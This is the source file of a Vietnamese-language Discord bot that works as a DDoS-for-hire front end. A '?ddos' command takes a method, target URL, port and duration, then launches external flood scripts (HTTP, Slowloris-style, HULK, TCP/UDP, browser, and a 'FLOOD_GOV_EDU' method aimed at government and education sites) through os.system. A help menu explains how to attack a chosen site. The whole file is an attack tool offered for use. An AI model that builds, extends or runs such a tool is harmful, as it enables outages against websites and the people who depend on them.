import discord,time
import random
import time
import os, sys, requests, json
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
from random import choice, randint, shuffle
token = "" ##Nhập Token Bot Dis vào đây
prefix = "?" ##Kí Tự Gọi Bot VD : !,?,+,-,>,....
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix,help_command=None, intents=intents)
threading = ThreadPoolExecutor(max_workers=int(100000000))
import os
import threading
import requests
from pystyle import *
import time
import sys
import uuid
import random
import socket
import requests


@commands.has_role("vip buy") ###Role để sử dụng spam, muốn all role thì xóa dòng này       
@bot.event
async def on_connect():
	os.system("clear")
	print(f"""     	Đang Kết Nối Với Máy Chủ : {bot.user}""")
	time.sleep(1.0)
	print(f"""
	
              	Bot Đang Hoạt Động !!!
        Đây Là Bot Discord: Trần Tuấn Phong ꪜ
                © Tran Tuan Phong ©
	""") ###print connect succes bot


ca = ["https://i.giphy.com/media/3oKIPtjElfqwMOTbH2/giphy.webp","https://media4.giphy.com/media/j4fbBhYgu8mNEHkQ4w/giphy.gif","https://i.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.webp","https://i.giphy.com/media/PqjTdvXImZQfcmTYEO/giphy.webp","https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/c3f78555389655.59822ff823efc.gif","https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/1abfa455389655.59822ff82373e.gif","https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/96f3e643377507.57ecc15e00698.gif"]


def http_raw(url, time, methods):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f'node HTTP-RAW.js {url} {time}')
def hulk(url, time, methods,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f'go run Hulk.go -site {url} -data {get}')
def tcp(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f'python tcp.py -i {ip} -p {port} -t {time} -th 9000')
def udp(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f'python tcp.py -i {url} -p {port} -t {time} -th 9000')
  
def slow(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f"node slow.js {url} {time}")

def http_rand(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f"node HTTP-RAND.js {url} {time}")
  print(f"{methods} Đã kết thúc")
  
def http(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f"node HTTP.js {url} {time}")
  print(f"{methods} Đã kết thúc")
  
def browser(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f"node BROWSER.js {url} {time} 1000 http.txt")
  print(f"{methods} Đã kết thúc")
def flood_gov_edu(url, time, methods,port,get):
  print(f"url: {url} Time: {time} methods: {methods}")
  print(f"{methods} Đang Bắt Đầu Tấn Công")
  os.system(f"node FLOOD_GOV_EDU.js {url}")
  print(f"{methods} Đã kết thúc")
@commands.has_role("admin") ###Role để sử dụng spam, muốn all role thì xóa dòng này
@bot.command()
async def ddos(ctx, methods, url, port:int, get, time:int):
    ca = ["https://media0.giphy.com/media/q217GUnfKAmJlFcjBX/giphy.gif","https://thumbs.gfycat.com/MemorableBetterCockroach-size_restricted.gif","https://thumbs.gfycat.com/BiodegradableWealthyEquestrian-size_restricted.gif","https://i.gifer.com/KNiu.gif","https://i.gifer.com/origin/55/55c3e37befd5601bdd738e8b06c14741_w200.gif","https://i.pinimg.com/originals/67/b2/a9/67b2a9ba5e85822f237caae92111e938.gif","https://i.pinimg.com/originals/1c/88/83/1c8883a1768f2f77caf0371d49a68dc2.gif","https://genk.mediacdn.vn/k:2016/6-1474109930503/15tamanhgifphananhhoanhaocamgiaccuafanhammoanime.gif"]
    gn = ["https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Flag_of_North_Vietnam_%281955%E2%80%931976%29.svg/230px-Flag_of_North_Vietnam_%281955%E2%80%931976%29.svg.png"]
    if methods in "http_raw" or methods in "HTTP_RAW" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        http_raw(url, time, methods)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    
    
    elif methods in "hulk" or methods in "HULK" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        hulk(url,time,methods,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    
    
    
    
    elif methods in "tcp" or methods in "TCP" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        tcp(url,time,methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    
    elif methods in "udp" or methods in "UDP" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        udp(url,time,methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    elif methods in "slow" or methods in "SLOW" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        slow(url, time, methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    
    elif methods in "http_rand" or methods in "HTTP_RAND" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        http_rand(url, time, methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        
    elif methods in "http" or methods in "HTTP" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        http(url, time, methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        
    elif methods in "browser" or methods in "BROWSER" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        browser(url, time, methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    
    elif methods in "flood_gov_edu" or methods in "FLOOD_GOV_EDU" :
      try:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
        gnrd = random.choice(gn)
        embes.set_thumbnail(url=gnrd)
        embes.add_field(name="**METHODS**",value=f"```{methods}```")
        embes.add_field(name="**TARGET**",value=f"```{url}```")
        embes.add_field(name="**PORT**",value=f"```{port}```")
        embes.add_field(name="**POST/GET**",value=f"```{get}```")
        embes.add_field(name="**TIME**",value=f"```{time}```")
        
        rd1 = random.choice(ca)
        embes.set_image(url=rd1)
        embes.set_footer(text=f"© Developer : Trần Tuấn Phong  | Requests By {ctx.author.name}")
        await ctx.channel.send(embed=embes)
        flood_gov_edu(url, time, methods,port,get)
      except:
        embes = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=discord.Colour.random())
        
    else:
      embent = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", color=0xFF0000)
      embent.add_field(name="**WARNING**",value="` Không Có METHODS Này `")
      embent.set_footer(text=f"© Developer : Trần Tuấn Phong ꪜ | Warning {ctx.author.name} !!!")
      await ctx.reply(embed=embent)
    

@bot.command()
async def helpurani(ctx):
	emBed = discord.Embed(title="🚀 * ᗪᗪOS ᑌᖇᗩᑎI ᗩTTᗩᑕK * 🚀", description="✨ **HELP MENU** ✨", color=discord.Colour.random())
	emBed.add_field(name="**METHODS DDOS LAYER 7**",value=f"`• HTTP_RAW\n• HULK\n• SLOW\n• HTTP_RAND\n• HTTP\n• FLOOD_GOV_EDU`")
	emBed.add_field(name="**METHODS DDOS LAYER 4**",value=f"`• TCP\n• UDP`")
	emBed.add_field(name="**RUN DDOS URANI**",value=f"- ?ddos METHODS URL PORT POST/GET TIME\n- VD: ?ddos http-raw http://example.com 80 GET 120")
	emBed.add_field(name="**Warning**",value=f"`• Phải Có Role @admin\n• methods : nhập các methods có ở hỗ trợ\n• url : link web muốn ddos`")
	emBed.set_footer(text=f"© Developer : Trần Tuấn Phong ꪜ | Requests By {ctx.author.name}")
  
	await ctx.channel.send(embed=emBed)
bot.run(token)
